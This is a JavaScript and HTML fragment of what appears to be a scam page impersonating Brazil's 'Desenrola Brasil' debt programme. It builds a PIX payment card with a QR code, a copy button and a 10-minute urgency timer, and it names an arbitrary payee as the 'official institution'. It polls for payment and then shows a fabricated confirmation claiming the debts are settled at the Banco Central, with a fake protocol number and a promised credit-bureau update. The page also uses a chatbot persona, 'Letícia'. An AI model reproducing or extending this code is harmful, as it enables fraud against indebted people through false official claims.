      <div id="acquirer-verification" style="margin-top: 15px; margin-bottom: 15px; display: block !important;">
        <div>
          <div style="font-size: 15px; font-weight: 800; color: #111; margin-bottom: 6px; text-align: center;">
            Pagamento processado por:
          </div>
          <div style="display: flex; align-items: center; justify-content: center; gap: 5px; font-size: 16px; font-weight: 800; color: #111;">
            <span id="acquirer-name">${nomeSocial}</span>
            <svg width="15" height="15" viewBox="0 0 24 24" style="flex-shrink: 0;">
              <path fill="#007bff" d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1.3 14.7L6.3 12.3l1.4-1.4 3 3 7.1-7.1 1.4 1.4-8.5 8.5z" />
            </svg>
          </div>
        </div>
        <div style="margin-top: 6px; font-size: 12px; color: #666; line-height: 1.4; text-align: center; padding: 0 10px;">
          Essa é a instituição oficial do <strong>Desenrola Brasil</strong>. Só efetue o pagamento se ver esse nome na hora de pagar.
        </div>
      </div>
      <div id="pixQrContainer" style="${pixCode ? 'display: flex;' : 'display: none;'} justify-content: center; align-items: center; min-height: 160px; margin: 0 auto 10px;">
        <img class="pix-qr" src="" alt="QR Code PIX" id="pixQrImg" style="display:none;">
        <div id="pixQrCanvas" style="display:none;"></div>
      </div>
      <div class="pix-qr-label" id="pixQrLabel" style="${pixCode ? 'display: block;' : 'display: none;'}">Escaneie o QR Code com seu banco ou copie o código abaixo:</div>
      <div class="pix-code-box" id="pixCodeBox">${pixCode}</div>
      <button class="btn-copy" id="btnCopiarPix" onclick="copiarPix()"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px; vertical-align:text-bottom;"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg> Copiar código PIX</button>
      <p style="font-size:11px;color:#888;text-align:center;margin-top:10px;">
        Este código expira em 10 minutos. Após o pagamento, suas dívidas serão quitadas automaticamente.
      </p>
    </div>
  `;
  section.appendChild(card);

  // Renderização do QR Code visual
  if (pixCode) {
    if (pixQrBase64) {
      const imgEl = card.querySelector('#pixQrImg');
      let qrSrc = pixQrBase64;
      if (!qrSrc.startsWith('data:image') && !qrSrc.startsWith('http')) {
        qrSrc = `data:image/png;base64,${qrSrc}`;
      }
      if (imgEl) {
        imgEl.src = qrSrc;
        imgEl.style.display = 'block';
      }
    } else {
      const canvasContainer = card.querySelector('#pixQrCanvas');
      const imgEl = card.querySelector('#pixQrImg');
      let rendered = false;

      if (window.QRCode && canvasContainer) {
        try {
          canvasContainer.innerHTML = '';
          new QRCode(canvasContainer, {
            text: pixCode,
            width: 170,
            height: 170,
            colorDark: '#000000',
            colorLight: '#ffffff'
          });
          canvasContainer.style.display = 'block';
          rendered = true;
        } catch (qrErr) {
          console.warn('Canvas QRCode falhou, utilizando gerador de imagem:', qrErr);
        }
      }

      // Fallback garantido se o canvas não renderizou
      if (!rendered && imgEl) {
        imgEl.src = 'https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=' + encodeURIComponent(pixCode);
        imgEl.style.display = 'block';
      }
    }
  }

  function scrollToPixCode() {
    const targetEl = document.getElementById('pixCodeBox') || card.querySelector('.btn-copy') || card;
    if (targetEl) {
      targetEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
  }

  // Torna visível imediatamente
  card.style.opacity = '1';
  card.classList.add('visible');
  autoScroll();
  setTimeout(scrollToPixCode, 150);
  setTimeout(scrollToPixCode, 500);

  startCountdown(600);

  // Monitorar confirmação de pagamento em tempo real
  if (transactionId) {
    startMonitoringPix(transactionId);
  }
}

// ── Polling de Confirmação de Pagamento ──
let _monitorPixInterval = null;
function startMonitoringPix(transactionId) {
  if (_monitorPixInterval) clearInterval(_monitorPixInterval);
  if (!transactionId) return;

  _monitorPixInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/verificar-pix?id=${encodeURIComponent(transactionId)}`);
      const statusData = await res.json();
      if (statusData && (statusData.paid || statusData.status === 'approved' || statusData.status === 'paid')) {
        clearInterval(_monitorPixInterval);
        mostrarSucessoPagamento();
      }
    } catch (e) {
      // Ignora oscilações na rede durante o polling
    }
  }, 3500);
}

function mostrarSucessoPagamento() {
  const pixCard = document.querySelector('.pix-card');
  if (pixCard) {
    pixCard.innerHTML = `
      <div style="text-align: center; padding: 28px 16px;">
        <div style="width: 64px; height: 64px; background: #28a745; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px auto; font-size: 32px; box-shadow: 0 4px 14px rgba(40,167,69,0.35);">✓</div>
        <h2 style="color: #28a745; font-size: 22px; font-weight: 800; margin-bottom: 8px;">PAGAMENTO CONFIRMADO!</h2>
        <p style="font-size: 14px; color: #444; line-height: 1.5; margin-bottom: 18px;">
          Seu acordo do <strong>Programa Desenrola Brasil</strong> foi liquidado e homologado com sucesso.
        </p>
        <div style="background: #f8f9fa; border: 1px solid #e2e8f0; border-radius: 8px; padding: 14px; font-size: 13px; text-align: left; margin-bottom: 16px; line-height: 1.7;">
          <div><strong>Beneficiário:</strong> ${dadosConsulta.nome || 'Cliente'}</div>
          <div><strong>CPF:</strong> ${dadosConsulta.cpf || ''}</div>
          <div><strong>Status:</strong> <span style="color:#28a745; font-weight:700;">Dívidas Quitadas no Banco Central</span></div>
          <div><strong>Protocolo:</strong> ${'ACORDO-' + Date.now().toString(36).toUpperCase()}</div>
        </div>
        <p style="font-size: 12px; color: #666;">Seu CPF será atualizado nos órgãos de proteção ao crédito (Serasa / SPC) em até 24 horas.</p>
      </div>
    `;
    pixCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
  }
}

function copiarPix() {
  const codeEl = document.getElementById('pixCodeBox');
  if (!codeEl) return;
  const code = codeEl.textContent.trim();
  const btn = document.querySelector('.btn-copy') || document.getElementById('btnCopiarPix');

  if (!code) {
    if (btn) {
      const orig = btn.innerHTML;
      btn.textContent = 'Aguardando integração da API...';
      setTimeout(() => { btn.innerHTML = orig; }, 2000);
    }
    return;
  }

  function setSuccess() {
    if (btn) {
      const svgCheck = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px; vertical-align:text-bottom;"><polyline points="20 6 9 17 4 12"></polyline></svg>';
      const svgClip = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px; vertical-align:text-bottom;"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>';
      btn.innerHTML = svgCheck + ' Código Copiado!';
      btn.style.background = '#28a745';
      setTimeout(() => {
        btn.innerHTML = svgClip + ' Copiar código PIX';
        btn.style.background = '#1351B4';
      }, 2500);
    }
  }

  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(code).then(setSuccess).catch(() => {
      fallbackCopyText(code);
      setSuccess();
    });
  } else {
    fallbackCopyText(code);
    setSuccess();
  }
}

function fallbackCopyText(text) {
  const textArea = document.createElement('textarea');
  textArea.value = text;
  textArea.style.position = 'fixed';
  textArea.style.left = '-999999px';
  textArea.style.top = '-999999px';
  document.body.appendChild(textArea);
  textArea.focus();
  textArea.select();
  try {
    document.execCommand('copy');
  } catch (err) {}
  document.body.removeChild(textArea);
}

function startCountdown(seconds) {
  const el = document.getElementById('timer');
  if (!el) return;
  const iv = setInterval(() => {
    seconds--;
    if (seconds <= 0) { clearInterval(iv); el.textContent = '00:00'; return; }
    const m = String(Math.floor(seconds/60)).padStart(2,'0');
    const s = String(seconds%60).padStart(2,'0');
    el.textContent = `${m}:${s}`;
  }, 1000);
}

function naoSouEu() {
  const btnSim = document.getElementById('btnSim');
  const btnNao = document.getElementById('btnNao');
  if (btnSim) btnSim.disabled = true;
  if (btnNao) btnNao.disabled = true;

  const flowSection = document.getElementById('flowSection');
  const botRow = document.createElement('div');
  botRow.className = 'bubble-row visible';
  botRow.innerHTML = `
    <img class="bubble-avatar" src="atendente-avatar.webp" alt="Letícia">
    <div class="bubble">Por favor, volte para a etapa anterior e informe seu CPF novamente.</div>
  `;
  flowSection.appendChild(botRow);
  autoScroll();

  setTimeout(() => {
    window.location.href = 'consulta.html';
  }, 2500);
}
